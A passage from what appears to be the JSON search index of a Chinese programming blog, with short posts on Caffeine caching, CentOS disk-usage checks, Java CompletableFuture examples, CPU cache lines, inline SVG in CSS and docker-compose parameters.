如果攻击者\u0026lt;=5，那么直接淘汰攻击者。这个逻辑在他的注释中有解释:\n他认为设置一个预热的门槛会让整体命中率更高。\n  其他情况，随机淘汰。\n  4. 异步高性能读写 对于异步高性能读写，有两个版本，一个版本强调RingBuffer的功劳，另外一个版本强调WAL（Write-Ahead Logging）的功劳。\nRingBuffer版本：\n在guava cache中我们说过其读写操作中夹杂着过期时间的处理，也就是你在一次Put操作中有可能还会做淘汰操作，虽然 Guava Cache 巧妙地利用了 JDK 的 ConcurrentHashMap（分段锁或者无锁 CAS）来降低锁的密度，达到提高并发度的目的，但是，对于一些热点数据，这种做法还是避免不了频繁的锁竞争，所以其读写性能会受到一定影响，可以看上面的图中，caffeine的确在读写操作上面完爆guava cache。主要是因为在caffeine，对这些事件的操作是通过异步操作，他将事件提交至队列，这里的队列的数据结构是RingBuffer,不清楚的可以看看这篇文章，你应该知道的高性能无锁队列Disruptor 。然后会通过默认的ForkJoinPool.commonPool()，或者自己配置线程池，进行取队列操作，然后在进行后续的淘汰，过期操作。\nWAL版本：\n一般的缓存每次对数据处理完之后（读的话，已经存在则直接返回，不存在则 load 数据，保存，再返回；写的话，则直接插入或更新），但是因为要维护一些淘汰策略，则需要一些额外的操作，诸如：\n 计算和比较数据的是否过期 统计频率（像 LFU 或其变种） 维护 read queue 和 write queue 淘汰符合条件的数据 等等。。。  这种数据的读写伴随着缓存状态的变更，Guava Cache 的做法是把这些操作和读写操作放在一起，在一个同步加锁的操作中完成，虽然 Guava Cache 巧妙地利用了 JDK 的 ConcurrentHashMap（分段锁或者无锁 CAS）来降低锁的密度，达到提高并发度的目的。但是，对于一些热点数据，这种做法还是避免不了频繁的锁竞争。Caffeine 借鉴了数据库系统的 WAL（Write-Ahead Logging）思想，即先写日志再执行操作，这种思想同样适合缓存的，执行读写操作时，先把操作记录在缓冲区，然后在合适的时机异步、批量地执行缓冲区中的内容。但在执行缓冲区的内容时，也是需要在缓冲区加上同步锁的，不然存在并发问题，只不过这样就可以把对锁的竞争从缓存数据转移到对缓冲区上。\n5. 总结 Caffeine 是一个优秀的本地缓存，通过使用 W-TinyLFU 算法， 基于Disruptor的异步高性能读写，使得它拥有高性能，高命中率（near optimal），低内存占用等特点。\n参考 深入解密来自未来的缓存-Caffeine 万字详解本地缓存之王 Caffeine 的高性能设计之道 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cs/other/caffeine/","series":["Manual"],"tags":["CS"],"title":"Caffeine"},{"categories":["其他"],"content":"Centos Linux清理磁盘空间\n df -hl 查看占比  [root@VM-0-12-centos apioak-document]# df -hl Filesystem Size Used Avail Use% Mounted on devtmpfs 1.9G 0 1.9G 0% /dev tmpfs 1.9G 24K 1.9G 1% /dev/shm tmpfs 1.9G 788K 1.9G 1% /run tmpfs 1.9G 0 1.9G 0% /sys/fs/cgroup /dev/vda1 50G 48G 0 100% / tmpfs 379M 0 379M 0% /run/user/0 overlay 50G 48G 0 100% /var/lib/docker/overlay2/b3b7c9bcd6a086d488f5ca533ec7fc934f863340e4efa40513c354f3a13c6ccd/merged shm 64M 0 64M 0% /var/lib/docker/containers/76627689f39c84201d3554e95cf7a8ca53bc53f660fbf1127d86c49db2a67591/mounts/shm overlay 50G 48G 0 100% /var/lib/docker/overlay2/f3fac618fb01637e586b483c87d9075d1cb08bee9c9d1f3afffd0a012394b067/merged shm 64M 0 64M 0% /var/lib/docker/containers/36172ef8f5a337d595f41fda4a2e7864b333278a9d2102b700d7f2a6f47c52a8/mounts/shm 在根目录执行du -sh *  [root@VM-0-12-centos /]# du -sh * 0\tbin 147M\tboot 987M\tdata 0\tdev 6.5G\tdocker 39M\tetc 4.0K\thome 0\tlib 0\tlib64 16K\tlost+found 4.0K\tmedia 4.0K\tmnt 20K\topt du: cannot access ‘proc/31203/task/31203/fd/4’: No such file or directory du: cannot access ‘proc/31203/task/31203/fdinfo/4’: No such file or directory du: cannot access ‘proc/31203/fd/4’: No such file or directory du: cannot access ‘proc/31203/fdinfo/4’: No such file or directory 0\tproc 1.6G\troot 788K\trun 0\tsbin 4.0K\tsrv 0\tsys 181M\ttmp 7.4G\tusr 31G\tvar cd到空间占用大的目录继续执行du -sh *  [root@VM-0-12-centos var]# du -sh * 4.0K\tadm 131M\tcache 4.0K\tcrash 20K\tdb 8.0K\tempty 4.0K\tgames 4.0K\tgopher 12K\tkerberos 27G\tlib 4.0K\tlocal 0\tlock 4.5G\tlog 0\tmail 4.0K\tnis 4.0K\topt 4.0K\tpreserve 0\trun 124K\tspool 24K\ttmp 4.0K\typ 清除占用大的log\n参考：\nCentos Linux 怎么清理磁盘占用空间大：/dev/xvda1 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/other/centos-linux%E6%B8%85%E7%90%86%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4/","series":["Manual"],"tags":["Other"],"title":"Centos Linux清理磁盘空间"},{"categories":["编程思想"],"content":"参考 MySQL之char、varchar和text的设计 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/mysql/char-varchar-text%E5%8C%BA%E5%88%AB/","series":["Manual"],"tags":["MySQL"],"title":"char varchar text区别"},{"categories":["编程思想"],"content":"列式存储优势   当查询语句只涉及部分列时，只需要扫描相关的列\n  每一列的数据都是相同类型的，彼此间相关性更大，对列数据压缩的效率较高\n  参考 “行式存储”和“列式存储”的区别 什么是ClickHouse？ ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/clickhouse/clickhouse%E7%BB%BC%E6%9C%AF/","series":["Manual"],"tags":["ClickHouse"],"title":"ClickHouse综述"},{"categories":["编程思想"],"content":"1. runAsync 和 supplyAsync方法 CompletableFuture 提供了四个静态方法来创建一个异步操作。\npublic static CompletableFuture\u0026lt;Void\u0026gt; runAsync(Runnable runnable) public static CompletableFuture\u0026lt;Void\u0026gt; runAsync(Runnable runnable, Executor executor) public static \u0026lt;U\u0026gt; CompletableFuture\u0026lt;U\u0026gt; supplyAsync(Supplier\u0026lt;U\u0026gt; supplier) public static \u0026lt;U\u0026gt; CompletableFuture\u0026lt;U\u0026gt; supplyAsync(Supplier\u0026lt;U\u0026gt; supplier, Executor executor) 没有指定Executor的方法会使用ForkJoinPool.commonPool() 作为它的线程池执行异步代码。如果指定线程池，则使用指定的线程池运行。以下所有的方法都类同。\n runAsync方法不支持返回值。 supplyAsync可以支持返回值。  示例 //无返回值 public static void runAsync() throws Exception { CompletableFuture\u0026lt;Void\u0026gt; future = CompletableFuture.runAsync(() -\u0026gt; { try { TimeUnit.SECONDS.sleep(1); } catch (InterruptedException e) { } System.out.println(\u0026#34;run end ...\u0026#34;); }); future.get(); } //有返回值 public static void supplyAsync() throws Exception { CompletableFuture\u0026lt;Long\u0026gt; future = CompletableFuture.supplyAsync(() -\u0026gt; { try { TimeUnit.SECONDS.sleep(1); } catch (InterruptedException e) { } System.out.println(\u0026#34;run end ...\u0026#34;); return System.currentTimeMillis(); }); long time = future.get(); System.out.println(\u0026#34;time = \u0026#34;+time); } 2. 计算结果完成时的回调方法 当CompletableFuture的计算结果完成，或者抛出异常的时候，可以执行特定的Action。主要是下面的方法：\npublic CompletableFuture\u0026lt;T\u0026gt; whenComplete(BiConsumer\u0026lt;? super T,? super Throwable\u0026gt; action) public CompletableFuture\u0026lt;T\u0026gt; whenCompleteAsync(BiConsumer\u0026lt;? super T,? super Throwable\u0026gt; action) public CompletableFuture\u0026lt;T\u0026gt; whenCompleteAsync(BiConsumer\u0026lt;? super T,? super Throwable\u0026gt; action, Executor executor) public CompletableFuture\u0026lt;T\u0026gt; exceptionally(Function\u0026lt;Throwable,? extends T\u0026gt; fn) 可以看到Action的类型是BiConsumer\u0026lt;? super T,? super Throwable\u0026gt;它可以处理正常的计算结果，或者异常情况。\nwhenComplete 和 whenCompleteAsync 的区别： whenComplete：是执行当前任务的线程执行继续执行 whenComplete 的任务。 whenCompleteAsync：是执行把 whenCompleteAsync 这个任务继续提交给线程池来进行执行。\n示例 public static void whenComplete() throws Exception { CompletableFuture\u0026lt;Void\u0026gt; future = CompletableFuture.runAsync(() -\u0026gt; { try { TimeUnit.SECONDS.sleep(1); } catch (InterruptedException e) { } if(new Random().nextInt()%2\u0026gt;=0) { int i = 12/0; } System.out.println(\u0026#34;run end ...\u0026#34;); }); future.whenComplete(new BiConsumer\u0026lt;Void, Throwable\u0026gt;() { @Override public void accept(Void t, Throwable action) { System.out.println(\u0026#34;执行完成！\u0026#34;); } }); future.exceptionally(new Function\u0026lt;Throwable, Void\u0026gt;() { @Override public Void apply(Throwable t) { System.out.println(\u0026#34;执行失败！\u0026#34;+t.getMessage()); return null; } }); TimeUnit.SECONDS.sleep(2); } 3. thenApply 方法 当一个线程依赖另一个线程时，可以使用 thenApply 方法来把这两个线程串行化。\npublic \u0026lt;U\u0026gt; CompletableFuture\u0026lt;U\u0026gt; thenApply(Function\u0026lt;? super T,? extends U\u0026gt; fn) public \u0026lt;U\u0026gt; CompletableFuture\u0026lt;U\u0026gt; thenApplyAsync(Function\u0026lt;? super T,? extends U\u0026gt; fn) public \u0026lt;U\u0026gt; CompletableFuture\u0026lt;U\u0026gt; thenApplyAsync(Function\u0026lt;? super T,? extends U\u0026gt; fn, Executor executor) Function\u0026lt;? super T,? extends U\u0026gt; T：上一个任务返回结果的类型 U：当前任务的返回值类型\n示例 private static void thenApply() throws Exception { CompletableFuture\u0026lt;Long\u0026gt; future = CompletableFuture.supplyAsync(new Supplier\u0026lt;Long\u0026gt;() { @Override public Long get() { long result = new Random().nextInt(100); System.out.println(\u0026#34;result1=\u0026#34;+result); return result; } }).thenApply(new Function\u0026lt;Long, Long\u0026gt;() { @Override public Long apply(Long t) { long result = t*5; System.out.println(\u0026#34;result2=\u0026#34;+result); return result; } }); long result = future.get(); System.out.println(result); } 第二个任务依赖第一个任务的结果。\n4. handle 方法 handle 是执行任务完成时对结果的处理。 handle 方法和 thenApply 方法处理方式基本一样。不同的是 handle 是在任务完成后再执行，还可以处理异常的任务。thenApply 只可以执行正常的任务，任务出现异常则不执行 thenApply 方法。\npublic \u0026lt;U\u0026gt; CompletionStage\u0026lt;U\u0026gt; handle(BiFunction\u0026lt;? super T, Throwable, ? extends U\u0026gt; fn); public \u0026lt;U\u0026gt; CompletionStage\u0026lt;U\u0026gt; handleAsync(BiFunction\u0026lt;? super T, Throwable, ? extends U\u0026gt; fn); public \u0026lt;U\u0026gt; CompletionStage\u0026lt;U\u0026gt; handleAsync(BiFunction\u0026lt;? super T, Throwable, ? extends U\u0026gt; fn,Executor executor); 示例 public static void handle() throws Exception{ CompletableFuture\u0026lt;Integer\u0026gt; future = CompletableFuture.supplyAsync(new Supplier\u0026lt;Integer\u0026gt;() { @Override public Integer get() { int i= 10/0; return new Random().nextInt(10); } }).handle(new BiFunction\u0026lt;Integer, Throwable, Integer\u0026gt;() { @Override public Integer apply(Integer param, Throwable throwable) { int result = -1; if(throwable==null){ result = param * 2; }else{ System.out.println(throwable.getMessage()); } return result; } }); System.out.println(future.get()); } 从示例中可以看出，在 handle 中可以根据任务是否有异常来进行做相应的后续处理操作。而 thenApply 方法，如果上个任务出现错误，则不会执行 thenApply 方法。\n5. thenAccept 消费处理结果 接收任务的处理结果，并消费处理，无返回结果。\npublic CompletionStage\u0026lt;Void\u0026gt; thenAccept(Consumer\u0026lt;? super T\u0026gt; action); public CompletionStage\u0026lt;Void\u0026gt; thenAcceptAsync(Consumer\u0026lt;? super T\u0026gt; action); public CompletionStage\u0026lt;Void\u0026gt; thenAcceptAsync(Consumer\u0026lt;? super T\u0026gt; action,Executor executor); 示例 public static void thenAccept() throws Exception{ CompletableFuture\u0026lt;Void\u0026gt; future = CompletableFuture.supplyAsync(new Supplier\u0026lt;Integer\u0026gt;() { @Override public Integer get() { return new Random().nextInt(10); } }).thenAccept(integer -\u0026gt; { System.out.println(integer); }); future.get(); } 从示例代码中可以看出，该方法只是消费执行完成的任务，并可以根据上面的任务返回的结果进行处理。并没有后续的输出操作。\n6. thenRun 方法 跟 thenAccept 方法不一样的是，不关心任务的处理结果。只要上面的任务执行完成，就开始执行 thenAccept 。\npublic CompletionStage\u0026lt;Void\u0026gt; thenRun(Runnable action); public CompletionStage\u0026lt;Void\u0026gt; thenRunAsync(Runnable action); public CompletionStage\u0026lt;Void\u0026gt; thenRunAsync(Runnable action,Executor executor); 示例 public static void thenRun() throws Exception{ CompletableFuture\u0026lt;Void\u0026gt; future = CompletableFuture.supplyAsync(new Supplier\u0026lt;Integer\u0026gt;() { @Override public Integer get() { return new Random().nextInt(10); } }).thenRun(() -\u0026gt; { System.out.println(\u0026#34;thenRun ...\u0026#34;); }); future.get(); } 该方法同 thenAccept 方法类似。不同的是上个任务处理完成后，并不会把计算的结果传给 thenRun 方法。只是处理玩任务后，执行 thenRun 的后续操作。\n7. thenCombine 合并任务 thenCombine 会把 两个 CompletionStage 的任务都执行完成后，把两个任务的结果一块交给 thenCombine 来处理。\npublic \u0026lt;U,V\u0026gt; CompletionStage\u0026lt;V\u0026gt; thenCombine(CompletionStage\u0026lt;? extends U\u0026gt; other,BiFunction\u0026lt;? super T,? super U,? extends V\u0026gt; fn); public \u0026lt;U,V\u0026gt; CompletionStage\u0026lt;V\u0026gt; thenCombineAsync(CompletionStage\u0026lt;? extends U\u0026gt; other,BiFunction\u0026lt;? super T,? super U,? extends V\u0026gt; fn); public \u0026lt;U,V\u0026gt; CompletionStage\u0026lt;V\u0026gt; thenCombineAsync(CompletionStage\u0026lt;? extends U\u0026gt; other,BiFunction\u0026lt;? super T,? super U,? extends V\u0026gt; fn,Executor executor); 示例 private static void thenCombine() throws Exception { CompletableFuture\u0026lt;String\u0026gt; future1 = CompletableFuture.supplyAsync(new Supplier\u0026lt;String\u0026gt;() { @Override public String get() { return \u0026#34;hello\u0026#34;; } }); CompletableFuture\u0026lt;String\u0026gt; future2 = CompletableFuture.supplyAsync(new Supplier\u0026lt;String\u0026gt;() { @Override public String get() { return \u0026#34;hello\u0026#34;; } }); CompletableFuture\u0026lt;String\u0026gt; result = future1.thenCombine(future2, new BiFunction\u0026lt;String, String, String\u0026gt;() { @Override public String apply(String t, String u) { return t+\u0026#34; \u0026#34;+u; } }); System.out.println(result.get()); } 8. thenAcceptBoth 当两个CompletionStage都执行完成后，把结果一块交给thenAcceptBoth来进行消耗\npublic \u0026lt;U\u0026gt; CompletionStage\u0026lt;Void\u0026gt; thenAcceptBoth(CompletionStage\u0026lt;? extends U\u0026gt; other,BiConsumer\u0026lt;? super T, ? super U\u0026gt; action); public \u0026lt;U\u0026gt; CompletionStage\u0026lt;Void\u0026gt; thenAcceptBothAsync(CompletionStage\u0026lt;? extends U\u0026gt; other,BiConsumer\u0026lt;? super T, ? super U\u0026gt; action); public \u0026lt;U\u0026gt; CompletionStage\u0026lt;Void\u0026gt; thenAcceptBothAsync(CompletionStage\u0026lt;? extends U\u0026gt; other,BiConsumer\u0026lt;? super T, ? super U\u0026gt; action, Executor executor); 示例 private static void thenAcceptBoth() throws Exception { CompletableFuture\u0026lt;Integer\u0026gt; f1 = CompletableFuture.supplyAsync(new Supplier\u0026lt;Integer\u0026gt;() { @Override public Integer get() { int t = new Random().nextInt(3); try { TimeUnit.SECONDS.sleep(t); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(\u0026#34;f1=\u0026#34;+t); return t; } }); CompletableFuture\u0026lt;Integer\u0026gt; f2 = CompletableFuture.supplyAsync(new Supplier\u0026lt;Integer\u0026gt;() { @Override public Integer get() { int t = new Random().nextInt(3); try { TimeUnit.SECONDS.sleep(t); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(\u0026#34;f2=\u0026#34;+t); return t; } }); f1.thenAcceptBoth(f2, new BiConsumer\u0026lt;Integer, Integer\u0026gt;() { @Override public void accept(Integer t, Integer u) { System.out.println(\u0026#34;f1=\u0026#34;+t+\u0026#34;;f2=\u0026#34;+u+\u0026#34;;\u0026#34;); } }); } 9. applyToEither 方法 两个CompletionStage，谁执行返回的结果快，我就用那个CompletionStage的结果进行下一步的转化操作。\npublic \u0026lt;U\u0026gt; CompletionStage\u0026lt;U\u0026gt; applyToEither(CompletionStage\u0026lt;? extends T\u0026gt; other,Function\u0026lt;? super T, U\u0026gt; fn); public \u0026lt;U\u0026gt; CompletionStage\u0026lt;U\u0026gt; applyToEitherAsync(CompletionStage\u0026lt;? extends T\u0026gt; other,Function\u0026lt;? super T, U\u0026gt; fn); public \u0026lt;U\u0026gt; CompletionStage\u0026lt;U\u0026gt; applyToEitherAsync(CompletionStage\u0026lt;? extends T\u0026gt; other,Function\u0026lt;? super T, U\u0026gt; fn,Executor executor); 示例 private static void applyToEither() throws Exception { CompletableFuture\u0026lt;Integer\u0026gt; f1 = CompletableFuture.supplyAsync(new Supplier\u0026lt;Integer\u0026gt;() { @Override public Integer get() { int t = new Random().nextInt(3); try { TimeUnit.SECONDS.sleep(t); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(\u0026#34;f1=\u0026#34; + t); return t; } }); CompletableFuture\u0026lt;Integer\u0026gt; f2 = CompletableFuture.supplyAsync(new Supplier\u0026lt;Integer\u0026gt;() { @Override public Integer get() { int t = new Random().nextInt(3); try { TimeUnit.SECONDS.sleep(t); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(\u0026#34;f2=\u0026#34; + t); return t; } }); CompletableFuture\u0026lt;Integer\u0026gt; result = f1.applyToEither(f2, new Function\u0026lt;Integer, Integer\u0026gt;() { @Override public Integer apply(Integer t) { System.out.println(t); return t * 2; } }); System.out.println(result.get()); //等待较慢的那个任务执行完毕  try { TimeUnit.SECONDS.sleep(5); } catch (InterruptedException e) { e.printStackTrace(); } } 10. acceptEither 方法 两个CompletionStage，谁执行返回的结果快，我就用那个CompletionStage的结果进行下一步的消耗操作。\npublic CompletionStage\u0026lt;Void\u0026gt; acceptEither(CompletionStage\u0026lt;? extends T\u0026gt; other,Consumer\u0026lt;? super T\u0026gt; action); public CompletionStage\u0026lt;Void\u0026gt; acceptEitherAsync(CompletionStage\u0026lt;? extends T\u0026gt; other,Consumer\u0026lt;? super T\u0026gt; action); public CompletionStage\u0026lt;Void\u0026gt; acceptEitherAsync(CompletionStage\u0026lt;? extends T\u0026gt; other,Consumer\u0026lt;? super T\u0026gt; action,Executor executor); 示例 private static void acceptEither() throws Exception { CompletableFuture\u0026lt;Integer\u0026gt; f1 = CompletableFuture.supplyAsync(new Supplier\u0026lt;Integer\u0026gt;() { @Override public Integer get() { int t = new Random().nextInt(3); try { TimeUnit.SECONDS.sleep(t); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(\u0026#34;f1=\u0026#34;+t); return t; } }); CompletableFuture\u0026lt;Integer\u0026gt; f2 = CompletableFuture.supplyAsync(new Supplier\u0026lt;Integer\u0026gt;() { @Override public Integer get() { int t = new Random().nextInt(3); try { TimeUnit.SECONDS.sleep(t); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(\u0026#34;f2=\u0026#34;+t); return t; } }); CompletableFuture\u0026lt;Void\u0026gt; f3 = f1.acceptEither(f2, new Consumer\u0026lt;Integer\u0026gt;() { @Override public void accept(Integer t) { System.out.println(t); } }); //阻塞等待，防止f3还没执行完，主线程就已经退出了  //f3.get(); } 11. runAfterEither 方法 两个CompletionStage，任何一个完成了都会执行下一步的操作（Runnable）\npublic CompletionStage\u0026lt;Void\u0026gt; runAfterEither(CompletionStage\u0026lt;?\u0026gt; other,Runnable action); public CompletionStage\u0026lt;Void\u0026gt; runAfterEitherAsync(CompletionStage\u0026lt;?\u0026gt; other,Runnable action); public CompletionStage\u0026lt;Void\u0026gt; runAfterEitherAsync(CompletionStage\u0026lt;?\u0026gt; other,Runnable action,Executor executor); 示例 private static void runAfterEither() throws Exception { CompletableFuture\u0026lt;Integer\u0026gt; f1 = CompletableFuture.supplyAsync(new Supplier\u0026lt;Integer\u0026gt;() { @Override public Integer get() { int t = new Random().nextInt(3); try { TimeUnit.SECONDS.sleep(t); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(\u0026#34;f1=\u0026#34;+t); return t; } }); CompletableFuture\u0026lt;Integer\u0026gt; f2 = CompletableFuture.supplyAsync(new Supplier\u0026lt;Integer\u0026gt;() { @Override public Integer get() { int t = new Random().nextInt(3); try { TimeUnit.SECONDS.sleep(t); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(\u0026#34;f2=\u0026#34;+t); return t; } }); CompletableFuture\u0026lt;Void\u0026gt; f3 = f1.runAfterEither(f2, new Runnable() { @Override public void run() { System.out.println(\u0026#34;上面有一个已经完成了。\u0026#34;); } }); //阻塞等待，防止f3还没执行完，主线程就已经退出了  //f3.get(); } 12. runAfterBoth 两个CompletionStage，都完成了计算才会执行下一步的操作（Runnable）\npublic CompletionStage\u0026lt;Void\u0026gt; runAfterBoth(CompletionStage\u0026lt;?\u0026gt; other,Runnable action); public CompletionStage\u0026lt;Void\u0026gt; runAfterBothAsync(CompletionStage\u0026lt;?\u0026gt; other,Runnable action); public CompletionStage\u0026lt;Void\u0026gt; runAfterBothAsync(CompletionStage\u0026lt;?\u0026gt; other,Runnable action,Executor executor); 示例 private static void runAfterBoth() throws Exception { CompletableFuture\u0026lt;Integer\u0026gt; f1 = CompletableFuture.supplyAsync(new Supplier\u0026lt;Integer\u0026gt;() { @Override public Integer get() { int t = new Random().nextInt(3); try { TimeUnit.SECONDS.sleep(t); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(\u0026#34;f1=\u0026#34;+t); return t; } }); CompletableFuture\u0026lt;Integer\u0026gt; f2 = CompletableFuture.supplyAsync(new Supplier\u0026lt;Integer\u0026gt;() { @Override public Integer get() { int t = new Random().nextInt(3); try { TimeUnit.SECONDS.sleep(t); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(\u0026#34;f2=\u0026#34;+t); return t; } }); CompletableFuture\u0026lt;Void\u0026gt; f3 = f1.runAfterBoth(f2, new Runnable() { @Override public void run() { System.out.println(\u0026#34;上面两个任务都执行完成了。\u0026#34;); } }); //阻塞等待，防止f3还没执行完，主线程就已经退出了  //f3.get(); } 13. thenCompose 方法 thenCompose 方法允许你对两个 CompletionStage 进行流水线操作，第一个操作完成时，将其结果作为参数传递给第二个操作。\npublic \u0026lt;U\u0026gt; CompletableFuture\u0026lt;U\u0026gt; thenCompose(Function\u0026lt;? super T, ? extends CompletionStage\u0026lt;U\u0026gt;\u0026gt; fn); public \u0026lt;U\u0026gt; CompletableFuture\u0026lt;U\u0026gt; thenComposeAsync(Function\u0026lt;? super T, ? extends CompletionStage\u0026lt;U\u0026gt;\u0026gt; fn) ; public \u0026lt;U\u0026gt; CompletableFuture\u0026lt;U\u0026gt; thenComposeAsync(Function\u0026lt;? super T, ? extends CompletionStage\u0026lt;U\u0026gt;\u0026gt; fn, Executor executor) ; 示例 private static void thenCompose() throws Exception { CompletableFuture\u0026lt;String\u0026gt; f = CompletableFuture.supplyAsync(new Supplier\u0026lt;Integer\u0026gt;() { @Override public Integer get() { int t = new Random().nextInt(10); System.out.println(\u0026#34;t1=\u0026#34;+t); return t; } }).thenCompose(new Function\u0026lt;Integer, CompletionStage\u0026lt;String\u0026gt;\u0026gt;() { @Override public CompletionStage\u0026lt;String\u0026gt; apply(Integer param) { return CompletableFuture.supplyAsync(new Supplier\u0026lt;String\u0026gt;() { @Override public String get() { int t = param *2; System.out.println(\u0026#34;t2=\u0026#34;+t); return t +\u0026#34;\u0026#34;; } }); } }); System.out.println(\u0026#34;thenCompose result : \u0026#34;+f.get()); } 参考： CompletableFuture 使用详解 编程老司机带你玩转 CompletableFuture 异步编程 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/completablefuture%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/","series":["Manual"],"tags":["Java"],"title":"CompletableFuture使用详解"},{"categories":["计算机科学"],"content":"JAVA 拾遗 — CPU Cache 与缓存行 既然CPU有缓存一致性协议（MESI），为什么JMM还需要volatile关键字？ 简而言之，CPU里的缓存，buffer，queue有很多种。MESI只能在一种情况下解决核心专有Cache之间不一致的问题。\n此外，如果有些CPU不支持MESI协议，那么必须用其他办法来实现等价的效果，比如总是用锁总线的方式，或者明确的fence指令来保证volatile想达到的目标。\n如果CPU是单核心的，cache是专供这个核心的，MESI理论上也就没有用了。但是依然要考虑主存和Cache被多个线程切换访问时带来的不一致问题。\n总之，volatile是一个高层的表达意图的“抽象”，而MESI是为了实现这个抽象，在某种特定情况下需要使用的一个实现细节。\nCPU缓存行 Java内存访问重排序的研究 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cs/other/cpu%E7%BC%93%E5%AD%98%E8%A1%8C/","series":["Manual"],"tags":["CS"],"title":"CPU缓存行"},{"categories":["其他"],"content":"CSS中内联SVG\n内联SVG比内联图像的base64效果更好，图片更加保真：\n.icon-arrow-down { width: 20px; height: 20px; background: url(\u0026#39;data:image/svg+xml;utf8,\u0026lt;svg version=\u0026#34;1.1\u0026#34; xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; width=\u0026#34;200\u0026#34; height=\u0026#34;200\u0026#34; viewBox=\u0026#34;0 0 200 200\u0026#34;\u0026gt;\u0026lt;path fill=\u0026#34;#00A5E0\u0026#34; d=\u0026#34;M145.659,68.949c-5.101-5.208-13.372-5.208-18.473,0L99.479,97.233 L71.772,68.949c-5.1-5.208-13.371-5.208-18.473,0c-5.099,5.208-5.099,13.648,0,18.857l46.18,47.14l46.181-47.14 C150.759,82.598,150.759,74.157,145.659,68.949z\u0026#34;/\u0026gt;\u0026lt;/svg\u0026gt;\u0026#39;) no-repeat center; background-size: 100%; } ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/other/css%E4%B8%AD%E5%86%85%E8%81%94svg/","series":["Manual"],"tags":["Other"],"title":"CSS中内联SVG"},{"categories":["其他"],"content":"docker-compose.yml文件详解\nCompose和Docker兼容性： Compose 文件格式有3个版本,分别为1, 2.x 和 3.x 目前主流的为 3.x 其支持 docker 1.13.0 及其以上的版本 常用参数： version  # 指定 compose 文件的版本 services  # 定义所有的 service 信息, services 下面的第一级别的 key 既是一个 service 的名称 build  # 指定包含构建上下文的路径, 或作为一个对象，该对象具有 context 和指定的 dockerfile 文件以及 args 参数值 context # context: 指定 Dockerfile 文件所在的路径 dockerfile # dockerfile: 指定 context 指定的目录下面的 Dockerfile 的名称(默认为 Dockerfile) args # args: Dockerfile 在 build 过程中需要的参数 (等同于 docker container build --build-arg 的作用) cache_from  # v3.2中新增的参数, 指定缓存的镜像列表 (等同于 docker container build --cache_from 的作用) labels  # v3.3中新增的参数, 设置镜像的元数据 (等同于 docker container build --labels 的作用) shm_size  # v3.5中新增的参数, 设置容器 /dev/shm 分区的大小 (等同于 docker container build --shm-size 的作用) command  # 覆盖容器启动后默认执行的命令, 支持 shell 格式和 [] 格式 configs  # 不知道怎么用 cgroup_parent  # 不知道怎么用 container_name  # 指定容器的名称 (等同于 docker run --name 的作用) credential_spec  # 不知道怎么用 deploy  # v3 版本以上, 指定与部署和运行服务相关的配置, deploy 部分是 docker stack 使用的, docker stack 依赖 docker swarm endpoint_mode  # v3.3 版本中新增的功能, 指定服务暴露的方式 vip  # Docker 为该服务分配了一个虚拟 IP(VIP), 作为客户端的访问服务的地址 dnsrr  # DNS轮询, Docker 为该服务设置 DNS 条目, 使得服务名称的 DNS 查询返回一个 IP 地址列表, 客户端直接访问其中的一个地址 labels  # 指定服务的标签，这些标签仅在服务上设置 mode  # 指定 deploy 的模式 global  # 每个集群节点都只有一个容器 replicated  # 用户可以指定集群中容器的数量(默认) placement  # 不知道怎么用 replicas  # deploy 的 mode 为 replicated 时, 指定容器副本的数量 resources  # 资源限制 limits  # 设置容器的资源限制 cpus: \u0026#34;0.5\u0026#34; # 设置该容器最多只能使用 50% 的 CPU  memory: 50M  # 设置该容器最多只能使用 50M 的内存空间  reservations  # 设置为容器预留的系统资源(随时可用) cpus: \u0026#34;0.2\u0026#34; # 为该容器保留 20% 的 CPU memory: 20M  # 为该容器保留 20M 的内存空间 restart_policy  # 定义容器重启策略, 用于代替 restart 参数 condition  # 定义容器重启策略(接受三个参数) none  # 不尝试重启 on-failure  # 只有当容器内部应用程序出现问题才会重启 any  # 无论如何都会尝试重启(默认) delay  # 尝试重启的间隔时间(默认为 0s) max_attempts  # 尝试重启次数(默认一直尝试重启) window  # 检查重启是否成功之前的等待时间(即如果容器启动了, 隔多少秒之后去检测容器是否正常, 默认 0s) update_config  # 用于配置滚动更新配置 parallelism  # 一次性更新的容器数量 delay  # 更新一组容器之间的间隔时间 failure_action  # 定义更新失败的策略 continue  # 继续更新 rollback  # 回滚更新 pause  # 暂停更新(默认) monitor # 每次更新后的持续时间以监视更新是否失败(单位: ns|us|ms|s|m|h) (默认为0) max_failure_ratio  # 回滚期间容忍的失败率(默认值为0) order  # v3.4 版本中新增的参数, 回滚期间的操作顺序 stop-first  #旧任务在启动新任务之前停止(默认) start-first  #首先启动新任务, 并且正在运行的任务暂时重叠 rollback_config  # v3.7 版本中新增的参数, 用于定义在 update_config 更新失败的回滚策略 parallelism  # 一次回滚的容器数, 如果设置为0, 则所有容器同时回滚 delay  # 每个组回滚之间的时间间隔(默认为0) failure_action  # 定义回滚失败的策略 continue  # 继续回滚 pause  